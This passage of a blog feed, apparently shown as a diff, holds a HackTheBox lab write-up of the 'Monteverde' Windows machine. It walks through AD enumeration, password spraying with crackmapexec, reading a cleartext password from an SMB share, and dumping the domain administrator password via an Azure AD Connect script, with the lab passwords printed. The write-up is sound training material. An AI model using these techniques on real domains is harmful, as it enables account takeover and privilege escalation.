-    [+] Password history length: 24
-    [+] Maximum password age: 41 days 23 hours 53 minutes 
-    [+] Password Complexity Flags: 000000
-    [+] Domain Refuse Password Change: 0
-    [+] Domain Password Store Cleartext: 0
-    [+] Domain Password Lockout Admins: 0
-    [+] Domain Password No Clear Change: 0
-    [+] Domain Password No Anon Change: 0
-    [+] Domain Password Complex: 0
-    [+] Minimum password age: 1 day 4 minutes 
-    [+] Reset Account Lockout Counter: 30 minutes 
-    [+] Locked Account Duration: 30 minutes 
-    [+] Account Lockout Threshold: None
-    [+] Forced Log off Time: Not Set
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
-    [+] Retieved partial password policy with rpcclient:
-    Password Complexity: Disabled
-    Minimum Password Length: 7
-    ================================ 
-    |    Groups on monteverde.htb    |
-    ================================ 
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
-    [+] Getting builtin groups:
-    group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
-    group:[Incoming Forest Trust Builders] rid:[0x22d]
-    group:[Windows Authorization Access Group] rid:[0x230]
-    group:[Terminal Server License Servers] rid:[0x231]
-    group:[Users] rid:[0x221]
-    group:[Guests] rid:[0x222]
-    group:[Remote Desktop Users] rid:[0x22b]
-    group:[Network Configuration Operators] rid:[0x22c]
-    group:[Performance Monitor Users] rid:[0x22e]
-    group:[Performance Log Users] rid:[0x22f]
-    group:[Distributed COM Users] rid:[0x232]
-    group:[IIS_IUSRS] rid:[0x238]
-    group:[Cryptographic Operators] rid:[0x239]
-    group:[Event Log Readers] rid:[0x23d]
-    group:[Certificate Service DCOM Access] rid:[0x23e]
-    group:[RDS Remote Access Servers] rid:[0x23f]
-    group:[RDS Endpoint Servers] rid:[0x240]
-    group:[RDS Management Servers] rid:[0x241]
-    group:[Hyper-V Administrators] rid:[0x242]
-    group:[Access Control Assistance Operators] rid:[0x243]
-    group:[Remote Management Users] rid:[0x244]
-    group:[Storage Replica Administrators] rid:[0x246]
-    [+] Getting local groups:
-    group:[Cert Publishers] rid:[0x205]
-    group:[RAS and IAS Servers] rid:[0x229]
-    group:[Allowed RODC Password Replication Group] rid:[0x23b]
-    group:[Denied RODC Password Replication Group] rid:[0x23c]
-    group:[DnsAdmins] rid:[0x44d]
-    group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
-    group:[ADSyncAdmins] rid:[0x451]
-    group:[ADSyncOperators] rid:[0x452]
-    group:[ADSyncBrowse] rid:[0x453]
-    group:[ADSyncPasswordSet] rid:[0x454]
-</code></pre></div></div>
-
-<h3 id="found-a-few-users-with-the-help-of-enum4linux">Found a few users with the help of Enum4Linux.</h3>
-
-<p>So, to simplyfy the output I used RPCCLIENT for a detailed ennumeration.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    rpcclient $&gt; enumdomusers 
-    user:[Guest] rid:[0x1f5]
-    user:[AAD_987d7f2f57d2] rid:[0x450]
-    user:[mhope] rid:[0x641]
-    user:[SABatchJobs] rid:[0xa2a]
-    user:[svc-ata] rid:[0xa2b]
-    user:[svc-bexec] rid:[0xa2c]
-    user:[svc-netapp] rid:[0xa2d]
-    user:[dgalanos] rid:[0xa35]
-    user:[roleary] rid:[0xa36]
-    user:[smorgan] rid:[0xa37]
-</code></pre></div></div>
-
-<h3 id="quering-all-the-users-info-using-rpcclient-i-found-that-mhopes-is-the-member-of-azure-domain-admins">Quering all the users info using RPCCLIENT, I found that mhopes is the member of AZURE DOMAIN ADMIN’S.</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    rpcclient $&gt; enumdomgroups 
-    group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-    group:[Domain Users] rid:[0x201]
-    group:[Domain Guests] rid:[0x202]
-    group:[Domain Computers] rid:[0x203]
-    group:[Group Policy Creator Owners] rid:[0x208]
-    group:[Cloneable Domain Controllers] rid:[0x20a]
-    group:[Protected Users] rid:[0x20d]
-    group:[DnsUpdateProxy] rid:[0x44e]
-    group:[Azure Admins] rid:[0xa29]
-    group:[File Server Admins] rid:[0xa2e]
-    group:[Call Recording Admins] rid:[0xa2f]
-    group:[Reception] rid:[0xa30]
-    group:[Operations] rid:[0xa31]
-    group:[Trading] rid:[0xa32]
-    group:[HelpDesk] rid:[0xa33]
-    group:[Developers] rid:[0xa34]
-
-
-                
-    rpcclient $&gt; queryuser 0x641
-    User Name   :   mhope
-    Full Name   :   Mike Hope
-    Home Drive  :   \\monteverde\users$\mhope
-    Dir Drive   :   H:
-    Profile Path:
-    Logon Script:
-    Description :
-    Workstations:
-    Comment     :
-    Remote Dial :
-    Logon Time               :      Fri, 12 Jun 2020 05:40:35 EDT
-    Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
-    Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
-    Password last set Time   :      Thu, 02 Jan 2020 18:40:06 EST
-    Password can change Time :      Fri, 03 Jan 2020 18:40:06 EST
-    Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
-    unknown_2[0..31]...
-    user_rid :      0x641
-    group_rid:      0x201
-    acb_info :      0x00000210
-    fields_present: 0x00ffffff
-    logon_divs:     168
-    bad_password_count:     0x00000000
-    logon_count:    0x00000002
-    padding1[0..7]...
-    logon_hrs[0..21]...
-</code></pre></div></div>
-
-<h3 id="so-i-quickly-made-the-user-list-and-tries-with-a-different-password-lists-but-no-luck-unfortunately-a-quick-idea-popped-into-my-mind-and-then-i-used-the-same-username-list-as-the-password-list-for-the-password-spray-using-crackmapexec">So I quickly made the user list and tries with a different password list(s), But no luck unfortunately. A quick idea popped into my mind and then I used the same username list as the password list for the password spray using crackmapexec.</h3>
-<h4 id="crackmapexec">crackmapexec</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SMB 10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
-    SMB 10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
-</code></pre></div></div>
-
-<h3 id="cracking-the-password-of-sabatchjobs-and-using-evil-winrm-didnt-return-anything-so-i-moved-on-trying-with-smb">Cracking the password of SABatchJobs and using Evil-WinRM didn’t return anything! So I moved on trying with SMB.</h3>
-<h4 id="smbclient">SMBCLIENT</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    smbclient -L  monteverde.htb -U SABatchJobs
-    Enter WORKGROUP\SABatchJobs's password: 
-    Sharename       Type      Comment
-    ---------       ----      -------
-    ADMIN$          Disk      Remote Admin
-    azure_uploads   Disk      
-    C$              Disk      Default share
-    E$              Disk      Default share
-    IPC$            IPC       Remote IPC
-    NETLOGON        Disk      Logon server share 
-    SYSVOL          Disk      Logon server share 
-    users$          Disk      
-    SMB1 disabled -- no workgroup available
-
-              
-    smbclient //monteverde.htb/users$ -U SABatchJobs
-    Enter WORKGROUP\SABatchJobs's password: 
-    Try "help" to get a list of possible commands.
-    smb: \&gt; ls
-    .                                   D        0  Fri Jan  3 08:12:48 2020
-    ..                                  D        0  Fri Jan  3 08:12:48 2020
-    dgalanos                            D        0  Fri Jan  3 08:12:30 2020
-    mhope                               D        0  Fri Jan  3 08:41:18 2020
-    roleary                             D        0  Fri Jan  3 08:10:30 2020
-    smorgan                             D        0  Fri Jan  3 08:10:24 2020
-    524031 blocks of size 4096\. 519955 blocks available
-    smb: \&gt; cd mhope
-    smb: \mhope\&gt; ls
-    .                                   D        0  Fri Jan  3 08:41:18 2020
-    ..                                  D        0  Fri Jan  3 08:41:18 2020
-    azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020
-    524031 blocks of size 4096\. 519955 blocks available
-    smb: \mhope\&gt; get azure.xml
-    getting file \mhope\azure.xml of size 1212 as azure.xml (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec) 
-</code></pre></div></div>
-
-<h3 id="looking-at-azurexml-file-password-of-mhope-is-found">Looking at AZURE.xml file, password of mhope is found!</h3>
-<p>Then using Evil-WinRM I was able to login as MHOPE.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    cat azure.xml   
-
-    &lt;t&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/t&gt;
-    &lt;t&gt;System.Object&lt;/t&gt;
-    &lt;tostring&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/tostring&gt;
-
-    &lt;dt n="StartDate"&gt;2020-01-03T05:35:00.7562298-08:00&lt;/dt&gt;
-
-    &lt;dt n="EndDate"&gt;2054-01-03T05:35:00.7562298-08:00&lt;/dt&gt;
-
-    &lt;g n="KeyId"&gt;00000000-0000-0000-0000-000000000000&lt;/g&gt;
-    &lt;s n="Password"&gt;4n0therD4y@n0th3r$&lt;/s&gt; 
-</code></pre></div></div>
-
-<h2 id="getting-usertxt">Getting user.txt</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$
-
-    Evil-WinRM shell v2.3
-
-    Info: Establishing connection to remote endpoint
-
-    *Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd ..
-    *Evil-WinRM* PS C:\Users\mhope&gt; cd Desktop
-    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cat user.txt
-    [4961************************12f2]
-</code></pre></div></div>
-
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    USER INFORMATION
-    ----------------
-    User Name      SID
-    ============== ============================================
-    megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601
-    GROUP INFORMATION
-    -----------------
-    Group Name                                  Type             SID                                          Attributes
-    =========================================== ================ ============================================ ==================================================
-    Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
-    BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
-    BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
-    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
-    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
-    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
-    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
-    MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
-    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
-    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
-    PRIVILEGES INFORMATION
-    ----------------------
-    Privilege Name                Description                    State
-    ============================= ============================== =======
-    SeMachineAccountPrivilege     Add workstations to domain     Enabled
-    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-    USER CLAIMS INFORMATION
-    -----------------------
-    User claims unknown.
-    Kerberos support for Dynamic Access Control on this device has been disabled. 
-</code></pre></div></div>
-
-<p>Seeing that [mhope] is a member of Azure Admin group [MEGABANK\Azure Admins]. This means mhope must me having the administrator rights on the domain. Looking for the exploit in google for quite a good time I came across a [powershell] script [AzureConnect]. So this script will return the Administrator password in Cleartext format. So I created a new file [adconnect.ps1] with the powershell script in it and uploaded the script.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; upload adconnect.ps1
-    Info: Uploading adconnect.ps1 to C:\Users\mhope\Desktop\adconnect.ps1
-
-    Data: 2936 bytes of 2936 bytes copied
-    Info: Upload successful!
-
-    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; dir
-    Directory: C:\Users\mhope\Desktop
-    Mode                LastWriteTime         Length Name
-    ----                -------------         ------ ----
-    -a----        6/11/2020  11:04 PM           2202 adconnect.ps1
-    -ar---         1/3/2020   5:48 AM             32 user.txt` 
-</code></pre></div></div>
-
-<p>This script needs to run in locally as I have a shell as mhope.<br />
-To have a more indepth view have a look on the below video.
-<br /></p>
-
-<p><a href="http://www.youtube.com/watch?v=JEIR5oGCwdg" title="hacking Azure AD via Active Directory"><img src="/assets/img/sample/montasure.png" alt="" /></a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; import-module ./adconnect.ps1
-    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; ./adconnect.ps1
-    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; Azure-ADConnect -server 127.0.0.1 -db ADSync
-    [+] Domain:  MEGABANK.LOCAL
-    [+] Username: administrator
-    [+]Password: d0m@in4dminyeah! 
-</code></pre></div></div>
-
-<h2 id="getting-roottxt">Getting root.txt</h2>
-
-<p>So, as I got the PASSWORD of Administrator, I can login as Administrator using Evil-WinRM and grab the root flag.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    evil-winrm -i monteverde.htb -u Administrator -p d0m@in4dminyeah!
-
-    Evil-WinRM shell v2.3
-    Info: Establishing connection to remote endpoint
-
-    *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
-    *Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
-    *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
-    [1290************************a0bc]
-    *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; 
-</code></pre></div></div>
-
-<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>
-
-<p><img src="/assets/img/sample/monteverde.png" alt="" /></p>
-
-<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
-
-<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="windows," /><category term="activedirectory," /><category term="evilwinrm," /><category term="hashcat," /><category term="impacket," /><category term="crackmapexec," /><category term="rpcclient" /><summary type="html"><![CDATA[Giving a try with enum4linux I was able to get some information about the machine like the usernames, password policies, etc. Finding that right password the right user took me a bit of more time than I expected.This machine is about Azure AD Connect Database Exploit. So in order to get the shell of administrator I need to have a shell of privileged user of the local domain, so that I can perform various attacks.]]></summary></entry></feed>
+<p>This is a fairly simple machine rated easy to intermediate. There is only one flag to capture root.txt.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="otherposts" /><category term="linux" /><summary type="html"><![CDATA[Ganana is the very first vulnerable machine created by me and now hosted on `VULNHUB`. You can download the machine and play with it. Works better with `Virtual-box`.]]></summary></entry></feed>
